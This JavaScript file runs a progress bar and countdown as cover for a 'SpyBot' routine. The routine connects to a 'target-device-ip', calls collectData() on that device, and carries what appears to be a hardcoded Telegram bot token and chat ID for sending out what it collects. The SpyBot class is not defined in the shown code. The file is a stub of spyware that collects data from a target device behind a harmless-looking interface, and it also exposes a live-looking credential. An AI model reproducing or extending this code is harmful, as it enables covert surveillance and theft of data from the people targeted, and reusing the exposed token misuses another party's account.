// JavaScript code in script.js

const progressBar = document.getElementById('progress');
const countdown = document.getElementById('countdown');

// Function to update the progress bar
function updateProgress(percentage) {
  progressBar.style.width = `${percentage}%`;
}

// Function to update the countdown
function updateCountdown(seconds) {
  countdown.textContent = seconds;
}

// Simulate data collection and progress updates
updateProgress(0);
updateCountdown(20);

setTimeout(() => {
  updateProgress(25);
  updateCountdown(15);
}, 2000);

// Simulate data collection and progress updates
setTimeout(() => {
  // Establish connection with the bot and collect data
  const bot = new SpyBot('target-device-ip', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E', '5375214810');

  bot.connect()
    .then(() => bot.collectData())
    .then(() => {
      // Display collected data on the HTML page
      const dataContainer = document.createElement('div');
      dataContainer.innerHTML = 'Data collection complete!';
      document.body.appendChild(dataContainer);
    })
    .catch(error => {
      console.error('Error:', error);
    });
}, 4000);
